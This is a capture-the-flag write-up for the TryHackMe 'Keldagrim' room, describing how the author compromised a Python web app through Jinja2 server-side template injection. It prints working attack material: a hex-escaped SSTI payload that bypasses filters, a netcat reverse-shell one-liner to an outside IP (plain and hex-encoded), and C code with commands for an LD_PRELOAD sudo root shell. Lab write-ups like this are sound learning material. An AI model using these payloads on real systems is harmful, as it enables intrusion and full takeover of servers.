# Keldagrim

"The dwarves are hiding their gold!"

https://tryhackme.com/room/keldagrim

A fun room, with some rarer techniques and difficulties to get in.

1. Recon via nmap revealed just 22 and 80
2. On 80 was a 'gold mining' site, for MMOs - enumeration revealed no hidden directories or functionality
3. However, triggering a 404 would result in a page reflecting the bad URL. Classic XSS, but more relevant here, also SSTI (server side template injection).
4. The server helpfully reported it was running python, and using the url `/{{7*'7'}}` resulted in `bad url /7777777` or similar, which indicated this was Jinja2 or similar.

At this point I got stuck and had to sleep on it. Many of the common SSTI injections failed: while I could call `config.items()` to get data that showed I was on the right track (including a message under secret_key called 'if_only_this_was_a_flag'... thanks), all the next step injections failed, trying to get RCE, with a bland 500 error. It appeared that brackets and periods would both fail. Ultimately I found a payload that escaped both, from this blog: https://gusralph.info/jinja2-ssti-research/. The payload was:

```
/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

This showed the user jed, bingo. Commands with spaces (e.g. `ls -la`) still failed however. Using + and %20 failed, but looking at the rest of the injection, hex encoding worked, e.g. `\x20` for spaces so the command would be `ls\x20-la`.

5. Trying the standard shell binder I use, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.176.61 4444 >/tmp/f` failed. I tried various encodings and got weird results, so in the end used cyberchef to render it to hex, and set the spaces between characters to `\x`, resulting in this final payload which worked:

```
/{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66\x3b\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x66\x7c\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x69\x20\x32\x3e\x26\x31\x7c\x6e\x63\x20\x31\x30\x2e\x31\x30\x2e\x31\x37\x36\x2e\x36\x31\x20\x34\x34\x34\x34\x20\x3e\x2f\x74\x6d\x70\x2f\x66')|attr('read')()}}
```

6. On the machine as Jed, the user flag is in their home dir (could have got this with the SSTI RCE already). Running sudo -l revealed:

```
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps
```

7. Being able to run ps as sudo is worthless, normally. I was stuck here for a bit, so ran linpeas.sh which revealed the bit I had missed: above, at the end of the default entries, is env_keep+=LD_PRELOAD

8. An LD_PRELOAD exploit is simple to perform. On my host machine I created shell.c like so:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

9. I then compiled this using `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`, then started a python webserver so i could download the binary to the client
10. Finally I triggered the exploit and got a root shell: `sudo LD_PRELOAD=/tmp/shell.so /bin/ps`

A small, two step room basically, but with some rarer privesc techniques, so fun.
